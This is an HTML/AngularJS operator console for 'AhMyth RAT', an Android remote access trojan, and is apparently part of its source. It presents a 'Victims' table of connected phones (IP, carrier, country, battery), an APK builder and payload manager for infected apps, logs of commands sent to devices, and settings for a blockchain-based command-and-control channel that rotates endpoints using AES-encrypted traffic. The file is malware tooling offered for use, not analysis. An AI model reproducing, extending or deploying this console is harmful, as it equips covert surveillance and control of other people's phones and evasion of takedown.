<!DOCTYPE html>
<html ng-app="myapp">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no" />
    <title>AhMyth RAT</title>

    <script>
        if (typeof module === 'object') {
            window.module = module;
            module = undefined;
        }
    </script>

    <script type="text/javascript" src="assets/js/lib/jquery-3.1.1.min.js"></script>
    <script type="text/javascript" src="../node_modules/fomantic-ui-css/semantic.min.js"></script>
    <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
    <script type="text/javascript" src="assets/js/controllers/AppCtrl.js"></script>

    <script>
        if (window.module) module = window.module;
        
        document.addEventListener('DOMContentLoaded', function() {
            // Fomantic UI bindings
            setTimeout(function() {
                if (typeof $ !== 'undefined') {
                    $('.menu .item').tab();
                    $('.ui.dropdown').dropdown();
                    $('.ui.checkbox').checkbox();
                }
            }, 200);

        });
    </script>

    <link rel="stylesheet" href="../node_modules/fomantic-ui-css/semantic.min.css" />
    <link rel="stylesheet" href="assets/css/mystyle.css">

    <style>
        :root {
            --log-panel-height: 200px;
        }
        
        body.log-resize-active {
            cursor: row-resize;
        }
        
        /* Prevent white flash - set dark background immediately */
        html, body {
            background: #0d1117 !important;
        }
        
        .main-container {
            display: flex;
            flex-direction: column;
            height: 100vh;
            background: #0d1117;
        }
        
        .content-area {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        
        .tab-content {
            flex: 1;
            overflow: hidden;
            display: none;
            padding: 16px;
        }
        
        .tab-content.active {
            display: flex;
            flex-direction: column;
        }
        
        /* Header */
        .header-panel {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 16px;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-lg);
            margin-bottom: 16px;
        }
        
        .header-panel__left {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        
        .header-panel__title {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .header-panel__title img {
            width: 32px;
            height: 32px;
        }
        
        .header-panel__title h2 {
            margin: 0;
            font-size: 16px;
            font-weight: 600;
            color: var(--text-primary);
        }
        
        .header-panel__title p {
            margin: 0;
            font-size: 12px;
            color: var(--text-secondary);
        }
        
        .header-panel__controls {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        /* Victims */
        .victims-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-lg);
            overflow: hidden;
        }
        
        .victims-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 16px;
            background: var(--bg-tertiary);
            border-bottom: 1px solid var(--border-color);
        }
        
        .victims-header__title {
            font-size: 13px;
            font-weight: 600;
            color: var(--text-primary);
        }
        
        .victims-content {
            flex: 1;
            overflow: auto;
        }
        
        .empty-state {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px;
            text-align: center;
            color: var(--text-muted);
        }
        
        .empty-state i {
            font-size: 48px;
            margin-bottom: 12px;
            opacity: 0.5;
        }
        
        .empty-state p {
            margin: 0;
            font-size: 13px;
        }
        
        /* Device Info Cell */
        .device-info {
            display: flex;
            flex-direction: column;
            gap: 2px;
        }
        
        .device-info__name {
            font-weight: 600;
            color: var(--text-primary);
            font-size: 12px;
        }
        
        .device-info__detail {
            font-size: 10px;
            color: var(--text-muted);
        }
        
        /* Android Version */
        .android-version {
            display: flex;
            align-items: center;
            gap: 4px;
            font-size: 11px;
            color: var(--text-secondary);
        }
        
        .android-version i {
            color: #3ddc84;
        }
        
        /* Battery Indicator */
        .battery-indicator {
            display: flex;
            align-items: center;
            gap: 4px;
            font-size: 11px;
            font-family: var(--font-mono);
        }
        
        .battery--high {
            color: var(--accent-success);
        }
        
        .battery--medium {
            color: var(--accent-warning);
        }
        
        .battery--low {
            color: var(--accent-danger);
        }
        
        /* Operator Name */
        .operator-name {
            font-size: 11px;
            color: var(--text-secondary);
            max-width: 100px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            display: block;
        }
        
        /* IP Address */
        .ip-address {
            font-family: var(--font-mono);
            font-size: 11px;
            color: var(--text-secondary);
        }
        
        /* Log */
        #log {
            display: flex;
            flex-direction: column;
            background: var(--bg-primary);
            border-top: 1px solid var(--border-color);
            border-radius: 0 0 10px 10px;
            overflow: hidden;        /* Don't scroll the container, only log-content */
            height: var(--log-panel-height, 200px);
            min-height: 120px;
            max-height: 70vh;
            flex-shrink: 0;
            -webkit-app-region: no-drag;  /* Prevent window drag on log panel */
            position: relative;
        }
        
        .log-resizer {
            height: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: row-resize;
            user-select: none;
            margin-bottom: 16px;
        }
        
        .log-resizer__handle {
            width: 120px;
            height: 4px;
            border-radius: 999px;
            background: var(--border-color);
            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.4);
            transition: background 0.2s ease;
        }
        
        .log-resizer:hover .log-resizer__handle {
            background: var(--accent-primary);
        }
        
        .log-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 8px 12px;
            background: var(--bg-secondary);
            border-bottom: 1px solid var(--border-color);
            flex-shrink: 0;
            -webkit-app-region: no-drag;  /* Prevent window drag on header */
        }
        
        .log-header__title {
            font-size: 11px;
            font-weight: 600;
            color: var(--text-secondary);
            text-transform: uppercase;
        }
        
        .log-content {
            flex: 1 1 auto;
            min-height: 0;           /* Critical for flex child scrolling */
            height: 100%;            /* Fill remaining space */
            padding: 8px 12px;
            overflow-y: scroll;      /* Always show scrollbar */
            overflow-x: hidden;
            scroll-behavior: smooth;
            font-family: var(--font-mono);
            font-size: 12px;
            user-select: text;
            -webkit-user-select: text;
            cursor: text;
            -webkit-overflow-scrolling: touch;
            -webkit-app-region: no-drag;  /* Prevent window drag, allow scroll */
        }
        
        /* Custom scrollbar for console log */
        .log-content::-webkit-scrollbar {
            width: 8px;
        }
        
        .log-content::-webkit-scrollbar-track {
            background: #1a1a1a;
        }
        
        .log-content::-webkit-scrollbar-thumb {
            background: #444;
            border-radius: 4px;
        }
        
        .log-content::-webkit-scrollbar-thumb:hover {
            background: #555;
        }
        
        .log-entry {
            display: flex;
            gap: 12px;
            padding: 3px 0;
            border-bottom: 1px solid rgba(48, 54, 61, 0.3);
        }
        
        .log-entry__time {
            flex-shrink: 0;
            color: var(--text-muted);
            font-size: 11px;
        }
        
        .log-entry__message {
            flex: 1;
            word-break: break-word;
        }
        
        .country-flag {
            font-size: 18px;
        }
        
        /* Logs Panel */
        .logs-panel {
            display: flex;
            flex-direction: column;
            height: 100%;
            min-height: 0;
            background: var(--bg-primary);
            overflow: hidden;
        }
        
        .logs-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 16px 20px;
            background: var(--bg-secondary);
            border-bottom: 1px solid var(--border-color);
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .logs-title {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 0;
            color: var(--text-primary);
            font-size: 18px;
        }
        
        .logs-controls {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .logs-filter {
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 12px;
            color: var(--text-secondary);
            cursor: pointer;
        }
        
        .logs-filter input[type="checkbox"] {
            margin: 0;
        }
        
        .logs-stats {
            display: flex;
            gap: 10px;
            padding: 10px 20px;
            background: var(--bg-secondary);
            border-bottom: 1px solid var(--border-color);
            flex-wrap: wrap;
        }
        
        .stat-badge {
            padding: 4px 10px;
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            font-size: 11px;
            color: var(--text-secondary);
        }
        
        .stat-badge--request {
            color: #2196F3;
            border-color: #2196F3;
        }
        
        .stat-badge--response {
            color: #4CAF50;
            border-color: #4CAF50;
        }
        
        .stat-badge--info {
            color: #FF9800;
            border-color: #FF9800;
        }
        
        .logs-content {
            flex: 1;
            min-height: 0;
            overflow-y: auto;
            overflow-x: hidden;
            padding: 10px;
            background: #1e1e1e;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            font-size: 12px;
            line-height: 1.6;
            scroll-behavior: smooth;
            -webkit-overflow-scrolling: touch;
        }
        
        .logs-body {
            flex: 1;
            min-height: 0;
            overflow-y: auto;
            overflow-x: hidden;
            padding: 12px;
            background: #0d1117;
            -webkit-app-region: no-drag;
        }
        
        .logs-output {
            margin: 0;
            padding: 0;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            font-size: 12px;
            line-height: 1.5;
            color: #c9d1d9;
            white-space: pre-wrap;
            word-break: break-word;
        }
        
        /* Custom scrollbar for logs */
        .logs-content::-webkit-scrollbar {
            width: 8px;
        }
        
        .logs-content::-webkit-scrollbar-track {
            background: #1a1a1a;
        }
        
        .logs-content::-webkit-scrollbar-thumb {
            background: #444;
            border-radius: 4px;
        }
        
        .logs-content::-webkit-scrollbar-thumb:hover {
            background: #555;
        }
        
        .log-entry {
            display: flex;
            align-items: flex-start;
            gap: 8px;
            padding: 6px 8px;
            margin-bottom: 2px;
            border-left: 3px solid transparent;
            word-break: break-word;
            transition: background 0.2s;
        }
        
        .log-entry:hover {
            background: rgba(255, 255, 255, 0.05);
        }
        
        .log-entry--request {
            border-left-color: #2196F3;
            background: rgba(33, 150, 243, 0.1);
        }
        
        .log-entry--response {
            border-left-color: #4CAF50;
            background: rgba(76, 175, 80, 0.1);
        }
        
        .log-entry--info {
            border-left-color: #FF9800;
            background: rgba(255, 152, 0, 0.1);
        }
        
        .log-entry--error {
            border-left-color: #f44336;
            background: rgba(244, 67, 54, 0.1);
        }
        
        .log-entry__time {
            flex-shrink: 0;
            color: #888;
            font-size: 11px;
            min-width: 80px;
        }
        
        .log-entry__type {
            flex-shrink: 0;
            font-weight: 600;
            font-size: 11px;
            min-width: 70px;
        }
        
        .log-entry__type--request {
            color: #2196F3;
        }
        
        .log-entry__type--response {
            color: #4CAF50;
        }
        
        .log-entry__type--info {
            color: #FF9800;
        }
        
        .log-entry__type--error {
            color: #f44336;
        }
        
        .log-entry__device {
            flex-shrink: 0;
            color: #9e9e9e;
            font-size: 11px;
            min-width: 120px;
            font-weight: 500;
        }
        
        .log-entry__command {
            flex-shrink: 0;
            color: #e0e0e0;
            font-weight: 600;
            min-width: 100px;
        }
        
        .log-entry__data {
            flex: 1;
            color: #b0b0b0;
            font-size: 11px;
        }
        
        .log-entry__data-toggle {
            color: #888;
            cursor: pointer;
            margin-right: 5px;
            user-select: none;
        }
        
        .log-entry__data-toggle:hover {
            color: #fff;
        }
        
        .log-entry__data-content {
            word-break: break-all;
        }
        
        .log-entry__data-content--expanded {
            white-space: pre-wrap;
            max-height: 500px;
            overflow-y: auto;
        }
        
        .logs-empty {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100%;
            color: var(--text-secondary);
            text-align: center;
            padding: 40px;
        }
        
        .logs-empty i {
            font-size: 48px;
            margin-bottom: 16px;
            opacity: 0.5;
        }
    </style>
<style>[ng-cloak],[data-ng-cloak],.ng-cloak{display:none !important;}</style>
</head>

<body ng-controller="AppCtrl" ng-cloak>
    <div class="main-container">
        <!-- Title Bar -->
        <div class="title-bar">
            <div class="title-bar__brand">
                <img src="assets/img/icon.png" alt="AhMyth" class="title-bar__logo">
                <span class="title-bar__title">AhMyth RAT</span>
            </div>
            <div class="title-bar__controls notDraggable">
                <button class="window-btn window-btn--minimize" ng-click="minimize()"></button>
                <button class="window-btn window-btn--maximize" ng-click="maximize()"></button>
                <button class="window-btn window-btn--close" ng-click="close()"></button>
            </div>
        </div>

        <!-- Tabs -->
        <div class="tab-nav notDraggable">
            <a class="tab-nav__item active" data-tab="victims">
                <i class="desktop icon"></i>
                Victims
            </a>
            <a class="tab-nav__item" data-tab="builder">
                <i class="android icon"></i>
                APK Builder
            </a>
            <a class="tab-nav__item" data-tab="dashboard">
                <i class="tachometer alternate icon"></i>
                Dashboard
            </a>
            <a class="tab-nav__item" data-tab="payloads">
                <i class="box icon"></i>
                Payloads
            </a>
            <a class="tab-nav__item" data-tab="test-suite">
                <i class="check circle icon"></i>
                Test Suite
            </a>
            <a class="tab-nav__item" data-tab="logs">
                <i class="terminal icon"></i>
                Logs
            </a>
            <a class="tab-nav__item" data-tab="blockchain-logs">
                <i class="linkify icon"></i>
                Blockchain Logs
            </a>
            <a class="tab-nav__item" data-tab="settings">
                <i class="cog icon"></i>
                Settings
            </a>
        </div>

        <!-- Content -->
        <div class="content-area notDraggable">
            <!-- Victims Tab -->
            <div class="tab-content active" data-tab="victims">
                <!-- Header -->
                <div class="header-panel">
                    <div class="header-panel__left">
                        <div class="header-panel__title">
                            <img src="assets/img/VictimsLab.png" alt="">
                            <div>
                                <h2>Victims Lab</h2>
                                <p>Connected: <strong ng-bind="getVictimCount() || 0"></strong></p>
                            </div>
                        </div>
                    </div>
                    <div class="header-panel__controls">
                        <div class="server-status" ng-class="{'server-status--listening': isListen || blockchainListening, 'server-status--stopped': !isListen && !blockchainListening}">
                            <span class="server-status__dot"></span>
                            <span ng-if="isListen && blockchainListening">TCP + Blockchain</span>
                            <span ng-if="isListen && !blockchainListening">TCP Listening</span>
                            <span ng-if="!isListen && blockchainListening">Blockchain Only</span>
                            <span ng-if="!isListen && !blockchainListening">Stopped</span>
                        </div>
                        <div class="server-controls__status" ng-if="blockchainListening" style="margin-left: 10px;">
                            <span class="status-dot status-dot--blockchain" style="background: #9945FF;"></span>
                            <span style="color: #9945FF;">Blockchain</span>
                        </div>
                        <div class="server-controls__input-group">
                            <span class="server-controls__label">Port</span>
                            <input type="text" class="server-controls__input" ng-model="port" placeholder="42474">
                        </div>
                        <button class="btn btn--primary" ng-click="clearLogs(); ListenTCP(port)" ng-disabled="isListen">
                            <i class="play icon"></i> Listen TCP
                        </button>
                        <button class="btn btn--primary" ng-click="clearLogs(); ListenBlockchain()" ng-disabled="blockchainListening">
                            <i class="linkify icon"></i> Listen Blockchain
                        </button>
                        <button class="btn btn--danger" ng-click="clearLogs(); StopListening(port)" ng-disabled="!isListen && !blockchainListening">
                            <i class="stop icon"></i> Stop
                        </button>
                    </div>
                </div>

                <!-- Victims Table -->
                <div class="victims-container">
                    <div class="victims-header">
                        <span class="victims-header__title">Connected Devices</span>
                        <span class="badge badge--success" ng-bind="(getOnlineCount() || 0) + ' online'"></span>
                        <span class="badge badge--secondary" ng-if="getOfflineCount() > 0" ng-bind="getOfflineCount() + ' offline'"></span>
                    </div>
                    <div class="victims-content">
                        <table class="victims-table" ng-if="getVictimCount() > 0">
                            <thead>
                                <tr>
                                    <th style="width: 110px;">Action</th>
                                    <th style="width: 50px;">Flag</th>
                                    <th>Device</th>
                                    <th style="width: 65px;">Android</th>
                                    <th style="width: 65px;">Battery</th>
                                    <th>Operator</th>
                                    <th>IP Address</th>
                                    <th style="width: 90px;">Conn</th>
                                    <th style="width: 80px;">Status</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr ng-repeat="(key, victim) in getFilteredVictims()" ng-class="{'victim-offline': !victim.isOnline}">
                                    <td>
                                        <button class="victims-table__open-btn" ng-click="openLab(key)" ng-disabled="!victim.isOnline" title="{{victim.isOnline ? 'Open Lab' : 'Offline'}}">
                                            <i class="external alternate icon"></i> Lab
                                        </button>
                                        <button class="victims-table__remove-btn" ng-click="removeVictim(key)" title="Remove from list">
                                            <i class="trash icon"></i>
                                        </button>
                                    </td>
                                    <td>
                                        <span class="country-flag" ng-bind-html="getCountryFlag(victim.country)"></span>
                                    </td>
                                    <td>
                                        <div class="device-info">
                                            <span class="device-info__name">{{victim.brand || victim.manf}} {{victim.model}}</span>
                                            <span class="device-info__detail">{{victim.manf}} • {{victim.product || victim.device || ''}}</span>
                                        </div>
                                    </td>
                                    <td>
                                        <span class="android-version">
                                            <i class="android icon"></i> {{victim.release}}
                                        </span>
                                    </td>
                                    <td>
                                        <span class="battery-indicator battery-live" ng-class="{'battery--low': victim.battery < 20, 'battery--medium': victim.battery >= 20 && victim.battery < 50, 'battery--high': victim.battery >= 50}">
                                            <i class="battery icon" ng-class="{'battery full': victim.battery >= 75, 'battery three quarters': victim.battery >= 50 && victim.battery < 75, 'battery half': victim.battery >= 25 && victim.battery < 50, 'battery quarter': victim.battery < 25}"></i>
                                            <span ng-if="victim.battery >= 0">{{victim.battery}}%</span>
                                            <span ng-if="victim.battery < 0">--</span>
                                        </span>
                                    </td>
                                    <td>
                                        <span class="operator-name">{{victim.operator || 'Unknown'}}</span>
                                    </td>
                                    <td>
                                        <span class="ip-address" ng-if="victim.country === 'BC' || victim.ip === 'Blockchain'">{{victim.walletAddress || victim.ip}}</span>
                                        <span class="ip-address" ng-if="victim.country !== 'BC' && victim.ip !== 'Blockchain'">{{victim.ip}}:{{victim.port}}</span>
                                    </td>
                                    <td>
                                        <span class="operator-name">{{victim.conn || victim.connectionType || (victim.country === 'BC' || victim.ip === 'Blockchain' || victim.isBlockchain ? 'blockchain' : 'tcp')}}</span>
                                    </td>
                                    <td>
                                        <span class="victims-table__status victims-table__status--online" ng-if="victim.isOnline !== false">
                                            <i class="circle icon"></i> Online
                                        </span>
                                        <span class="victims-table__status victims-table__status--offline" ng-if="victim.isOnline === false">
                                            <i class="circle outline icon"></i> Offline
                                        </span>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                        <div class="empty-state" ng-if="!victims || getVictimCount() === 0">
                            <i class="wifi icon"></i>
                            <p>No connected devices. Start listening to receive connections.</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Builder Tab -->
            <div class="tab-content" data-tab="builder">
                <div ng-include="'views/build.html'" class="full" style="overflow-y: auto;"></div>
            </div>

            <!-- Dashboard Tab -->
            <div class="tab-content" data-tab="dashboard">
                <div class="dashboard-panel">
                    <h2 class="dashboard-title"><i class="tachometer alternate icon"></i> Dashboard</h2>
                    
                    <div class="stats-grid">
                        <div class="stat-card stat-card--primary">
                            <i class="desktop icon"></i>
                            <div class="stat-value" ng-bind="getOnlineCount() || 0"></div>
                            <div class="stat-label">Online Devices</div>
                        </div>
                        <div class="stat-card stat-card--warning">
                            <i class="moon icon"></i>
                            <div class="stat-value" ng-bind="getOfflineCount() || 0"></div>
                            <div class="stat-label">Offline Devices</div>
                        </div>
                        <div class="stat-card stat-card--info">
                            <i class="history icon"></i>
                            <div class="stat-value" ng-bind="getVictimCount() || 0"></div>
                            <div class="stat-label">Total Sessions</div>
                        </div>
                        <div class="stat-card stat-card--success">
                            <i class="server icon"></i>
                            <div class="stat-value" ng-if="isListen || blockchainListening">Active</div>
                            <div class="stat-value" ng-if="!isListen && !blockchainListening">Stopped</div>
                            <div class="stat-label">Server Status</div>
                        </div>
                    </div>

                    <div class="dashboard-section">
                        <h3><i class="clock icon"></i> Recent Activity</h3>
                        <div class="activity-list">
                            <div class="activity-item" ng-repeat="log in logs | limitTo:-10 track by $index">
                                <span class="activity-time">{{log.date}}</span>
                                <span class="activity-msg" ng-style="{'color': log.color}">{{log.msg}}</span>
                            </div>
                            <div class="empty-state" ng-if="!logs || logs.length === 0">
                                <p>No recent activity</p>
                            </div>
                        </div>
                    </div>

                    <div class="dashboard-section">
                        <h3><i class="info circle icon"></i> Quick Stats</h3>
                        <div class="quick-stats">
                            <div class="quick-stat">
                                <span class="quick-stat__label">Server Port</span>
                                <span class="quick-stat__value" ng-bind="port || 'Not set'"></span>
                            </div>
                            <div class="quick-stat">
                                <span class="quick-stat__label">Platform</span>
                                <span class="quick-stat__value" ng-bind="platform"></span>
                            </div>
                            <div class="quick-stat">
                                <span class="quick-stat__label">Version</span>
                                <span class="quick-stat__value">1.0.0</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Payloads Tab -->
            <div class="tab-content" data-tab="payloads">
                <div class="payloads-panel">
                    <h2 class="dashboard-title"><i class="box icon"></i> Payload Manager</h2>
                    
                    <div class="payload-section">
                        <h3><i class="folder icon"></i> Built APKs</h3>
                        <div class="payload-list">
                            <div class="payload-item" ng-repeat="payload in builtPayloads">
                                <div class="payload-info">
                                    <i class="android icon"></i>
                                    <span class="payload-name">{{payload.name}}</span>
                                    <span class="payload-size">{{payload.size}}</span>
                                </div>
                                <div class="payload-actions">
                                    <button class="btn btn--small" ng-click="copyPayloadPath(payload)">
                                        <i class="copy icon"></i>
                                    </button>
                                    <button class="btn btn--small" ng-click="openPayloadFolder()">
                                        <i class="folder open icon"></i>
                                    </button>
                                </div>
                            </div>
                            <div class="empty-state" ng-if="!builtPayloads || builtPayloads.length === 0">
                                <i class="box icon"></i>
                                <p>No payloads built yet. Use APK Builder to create one.</p>
                            </div>
                        </div>
                        <button class="btn btn--secondary" ng-click="refreshPayloads()">
                            <i class="sync icon"></i> Refresh
                        </button>
                        <button class="btn btn--secondary" ng-click="openOutputFolder()">
                            <i class="folder open icon"></i> Open Output Folder
                        </button>
                    </div>
                </div>
            </div>

            <!-- Test Suite Tab -->
            <div class="tab-content" data-tab="test-suite">
                <div ng-include="'views/testSuite.html'" class="full" style="overflow-y: auto;"></div>
            </div>

            <!-- Logs Tab -->
            <div class="tab-content" data-tab="logs">
                <div class="logs-panel">
                    <div class="logs-header">
                        <h2 class="logs-title">
                            <i class="terminal icon"></i>
                            Request/Response Logs
                        </h2>
                        <div class="logs-controls">
                            <button class="btn btn--small btn--secondary" ng-click="clearRequestLogs()" title="Clear logs">
                                <i class="trash icon"></i> Clear
                            </button>
                            <button class="btn btn--small btn--secondary" ng-click="toggleAutoScroll()" title="Auto-scroll">
                                <i class="arrow down icon" ng-if="autoScrollLogs"></i>
                                <i class="pause icon" ng-if="!autoScrollLogs"></i>
                                <span ng-bind="autoScrollLogs ? 'Auto-scroll ON' : 'Auto-scroll OFF'"></span>
                            </button>
                            <label class="logs-filter">
                                <input type="checkbox" ng-model="logFilters.request" ng-change="applyLogFilters()"> Requests
                            </label>
                            <label class="logs-filter">
                                <input type="checkbox" ng-model="logFilters.response" ng-change="applyLogFilters()"> Responses
                            </label>
                            <label class="logs-filter">
                                <input type="checkbox" ng-model="logFilters.info" ng-change="applyLogFilters()"> Info
                            </label>
                        </div>
                    </div>
                    
                    <div class="logs-stats" ng-if="requestLogs.length > 0">
                        <span class="stat-badge">Total: {{requestLogs.length}}</span>
                        <span class="stat-badge stat-badge--request">Requests: {{getLogCount('request')}}</span>
                        <span class="stat-badge stat-badge--response">Responses: {{getLogCount('response')}}</span>
                        <span class="stat-badge stat-badge--info">Info: {{getLogCount('info')}}</span>
                    </div>
                    
                    <div class="logs-content" id="logsContent">
                        <div class="log-entry" 
                             ng-repeat="log in filteredLogs = (requestLogs | filter:logFilter) track by $index"
                             ng-class="{'log-entry--request': log.type === 'request', 
                                      'log-entry--response': log.type === 'response',
                                      'log-entry--info': log.type === 'info',
                                      'log-entry--error': log.type === 'error'}">
                            <span class="log-entry__time">{{log.time}}</span>
                            <span class="log-entry__type" ng-class="'log-entry__type--' + log.type">
                                [{{log.type.toUpperCase()}}]
                            </span>
                            <span class="log-entry__device" ng-if="log.deviceId">{{log.deviceId}}:</span>
                            <span class="log-entry__command">{{log.command}}</span>
                            <span class="log-entry__data" ng-if="log.data">
                                <span class="log-entry__data-toggle" ng-click="toggleLogData($index)" ng-if="log.data.length > 200">
                                    {{log.expanded ? '▼' : '▶'}}
                                </span>
                                <span class="log-entry__data-content" ng-class="{'log-entry__data-content--expanded': log.expanded}">
                                    {{log.expanded ? log.data : (log.data.substring(0, 200) + (log.data.length > 200 ? '...' : ''))}}
                                </span>
                            </span>
                        </div>
                        <div class="logs-empty" ng-if="filteredLogs.length === 0">
                            <i class="info circle icon"></i>
                            <p>No logs to display. Logs will appear here as requests and responses are made.</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Blockchain Logs Tab -->
            <div class="tab-content" data-tab="blockchain-logs">
                <div class="logs-panel">
                    <div class="logs-header">
                        <h2 class="logs-title">
                            <i class="linkify icon"></i>
                            Blockchain Logs
                        </h2>
                        <div class="logs-controls">
                            <button class="btn btn--small btn--secondary" ng-click="clearBlockchainLogs()" title="Clear logs">
                                <i class="trash icon"></i> Clear
                            </button>
                            <button class="btn btn--small btn--secondary" ng-click="toggleBlockchainAutoScroll()" title="Auto-scroll">
                                <i class="arrow down icon" ng-if="autoScrollBlockchainLogs"></i>
                                <i class="pause icon" ng-if="!autoScrollBlockchainLogs"></i>
                                <span ng-bind="autoScrollBlockchainLogs ? 'Auto-scroll ON' : 'Auto-scroll OFF'"></span>
                            </button>
                        </div>
                    </div>
                    <div class="logs-body">
                        <pre class="logs-output" id="blockchainLogs" ng-bind="blockchainLogs"></pre>
                    </div>
                </div>
            </div>

            <!-- Settings Tab -->
            <div class="tab-content" data-tab="settings">
                <div class="settings-panel">
                    <h2 class="dashboard-title"><i class="cog icon"></i> Settings</h2>
                    
                    <div class="settings-section">
                        <h3><i class="server icon"></i> Server Settings</h3>
                        <div class="settings-group">
                            <label class="settings-item">
                                <span class="settings-label">Default Port</span>
                                <input type="number" class="settings-input" ng-model="defaultPort" placeholder="42474">
                            </label>
                            <label class="settings-item">
                                <span class="settings-label">Auto-start Server</span>
                                <input type="checkbox" ng-model="autoStartServer">
                            </label>
                        </div>
                    </div>

                    <div class="settings-section">
                        <h3><i class="linkify icon"></i> Blockchain C2 Configuration</h3>
                        <div class="settings-group">
                            <label class="settings-item">
                                <span class="settings-label">Enable Blockchain C2</span>
                                <input type="checkbox" ng-model="blockchainC2Enabled" ng-change="saveBlockchainC2Config()">
                            </label>
                            <label class="settings-item">
                                <span class="settings-label">RPC URL</span>
                                <input type="text" class="settings-input" ng-model="blockchainC2RpcUrl" placeholder="https://mainnet.infura.io/v3/YOUR_PROJECT_ID" ng-change="saveBlockchainC2Config()">
                                <small class="settings-hint">Ethereum RPC endpoint (Infura, Alchemy, QuickNode)</small>
                            </label>
                            <label class="settings-item">
                                <span class="settings-label">Contract Address (Optional)</span>
                                <input type="text" class="settings-input" ng-model="blockchainC2Contract" placeholder="0x0000000000000000000000000000000000000000" ng-change="saveBlockchainC2Config()">
                                <small class="settings-hint">Smart contract address for on-chain endpoints</small>
                            </label>
                            <label class="settings-item">
                                <span class="settings-label">Block Step</span>
                                <input type="number" class="settings-input" ng-model="blockchainC2BlockStep" min="1" max="100" placeholder="10" ng-change="saveBlockchainC2Config()">
                                <small class="settings-hint">Block interval for endpoint rotation</small>
                            </label>
                            <label class="settings-item">
                                <span class="settings-label">Candidates Per Cycle</span>
                                <input type="number" class="settings-input" ng-model="blockchainC2Candidates" min="1" max="20" placeholder="5" ng-change="saveBlockchainC2Config()">
                                <small class="settings-hint">Number of endpoint candidates per rotation</small>
                            </label>
                            <label class="settings-item">
                                <span class="settings-label">AES Key (Hex, 64 chars)</span>
                                <input type="text" class="settings-input" ng-model="builder.blockchainC2AesKey" placeholder="0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef" maxlength="64" ng-change="saveBlockchainC2Config()">
                                <small class="settings-hint">32-byte AES key in hexadecimal format (set via environment variable: BLOCKCHAIN_C2_AES_KEY)</small>
                            </label>
                            <div class="info-box" style="margin-top: 12px; padding: 12px; background: rgba(33, 150, 243, 0.1); border-left: 3px solid #2196F3; border-radius: 4px;">
                                <p style="margin: 0; font-size: 12px; color: var(--text-primary);">
                                    <i class="info circle icon"></i> <strong>Blockchain C2:</strong> Uses blockchain block hashes to generate rotating C2 endpoints. 
                                    Requires RPC access and optional smart contract. Falls back to TCP/IP if unavailable.
                                    <br><br>
                                    <strong>Setup:</strong> Get free RPC access from <a href="https://infura.io" target="_blank">Infura</a>, 
                                    <a href="https://alchemy.com" target="_blank">Alchemy</a>, or 
                                    <a href="https://quicknode.com" target="_blank">QuickNode</a>.
                                </p>
                            </div>
                        </div>
                    </div>

                    <div class="settings-section">
                        <h3><i class="bell icon"></i> Notifications</h3>
                        <div class="settings-group">
                            <label class="settings-item">
                                <span class="settings-label">Show connection notifications</span>
                                <input type="checkbox" ng-model="showNotifications" checked>
                            </label>
                            <label class="settings-item">
                                <span class="settings-label">Play sound on new victim</span>
                                <input type="checkbox" ng-model="playSoundOnVictim">
                            </label>
                        </div>
                    </div>

                    <div class="settings-section">
                        <h3><i class="folder icon"></i> Paths</h3>
                        <div class="settings-group">
                            <div class="settings-item">
                                <span class="settings-label">Output Folder</span>
                                <div class="settings-path">
                                    <span>{{outputPath}}</span>
                                    <button class="btn btn--small" ng-click="openOutputFolder()">
                                        <i class="folder open icon"></i>
                                    </button>
                                </div>
                            </div>
                            <div class="settings-item">
                                <span class="settings-label">Downloads Folder</span>
                                <div class="settings-path">
                                    <span>{{downloadsPath}}</span>
                                    <button class="btn btn--small" ng-click="openDownloadsFolder()">
                                        <i class="folder open icon"></i>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="settings-section">
                        <h3><i class="info circle icon"></i> About</h3>
                        <div class="about-info">
                            <p><strong>AhMyth RAT</strong> - Android Remote Administration Tool</p>
                            <p>Built with Electron, Node.js, and Socket.IO</p>
                            <p class="version-info">Version 1.0.0 • Custom Build</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Log -->
        <div id="log">
            <div class="log-header">
                <span class="log-header__title">Console</span>
                <button class="btn btn--secondary btn--icon" ng-click="clearLogs()" title="Clear">
                    <i class="trash icon"></i>
                </button>
            </div>
            <div class="log-content">
                <div ng-repeat="log in logs track by $index" class="log-entry">
                    <span class="log-entry__time" ng-bind="log.date"></span>
                    <span class="log-entry__message" ng-style="{'color': log.color}" ng-if="!log.isHtml" ng-bind="log.msg"></span>
                    <span class="log-entry__message" ng-style="{'color': log.color}" ng-if="log.isHtml" ng-bind-html="$sce.trustAsHtml(log.displayMsg)"></span>
                </div>
            </div>
        </div>
